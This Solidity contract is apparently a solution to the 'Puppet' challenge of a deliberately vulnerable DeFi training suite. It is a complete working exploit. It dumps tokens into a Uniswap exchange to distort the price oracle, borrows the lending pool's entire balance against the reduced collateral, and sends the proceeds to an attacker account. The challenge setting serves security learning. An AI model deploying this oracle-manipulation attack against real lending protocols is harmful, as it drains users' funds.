// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IPool {
    function borrow(uint256 borrowAmount) external payable;

    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);
}

interface IUniswapExchange {
    function tokenToEthTransferInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline,
        address recipient
    ) external 
    returns (uint256 eth_bought);

    function ethToTokenSwapInput(
        uint256 min_tokens, 
        uint256 deadline
    ) external payable
    returns (uint256 tokens_bought);
}

contract PuppetAttack {
    using Address for address payable;

    IPool pool;
    IUniswapExchange uniswap;
    DamnValuableToken token;
    address payable attackerEOA;

    constructor(
        IPool _pool,
        IUniswapExchange _uniswap,
        DamnValuableToken _token,
        address payable _attackerEOA
    ) {
        pool = _pool;
        uniswap = _uniswap;
        token = _token;
        attackerEOA = _attackerEOA;
    }

    function attack() external payable {
        //transfer tokens to attack contract
        token.transferFrom(
            attackerEOA,
            address(this),
            token.balanceOf(address(attackerEOA))
        );

        require(token.balanceOf(address(this)) > 0, "No token to trade");

        //approve tokens
        token.approve(address(uniswap), type(uint256).max);

        //get pool balance
        uint256 _poolBal = token.balanceOf(address(pool));
        console.log("the pool balance is", _poolBal / 10**18);

        //calculate collateral
        uint256 _colateral = pool.calculateDepositRequired(_poolBal);
        console.log("colateral needed is", _colateral / 10**18);

        //trade token to offset pool dynamic
        uniswap.tokenToEthTransferInput(
            token.balanceOf(address(this)),
            1,
            block.timestamp + 600 seconds,
            address(this)
        );

        //calculate collateral again  
        _colateral = pool.calculateDepositRequired(_poolBal);
        console.log("colateral needed is", _colateral / 10**18);

        //borrow tokens
        pool.borrow{value: _colateral}(_poolBal);

        //trade leftover eth for tokens
        uniswap.ethToTokenSwapInput{value: address(this).balance}(
            1,
            block.timestamp + 500 seconds
        );

        //transfer to attackerEOA
        token.transfer(attackerEOA, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
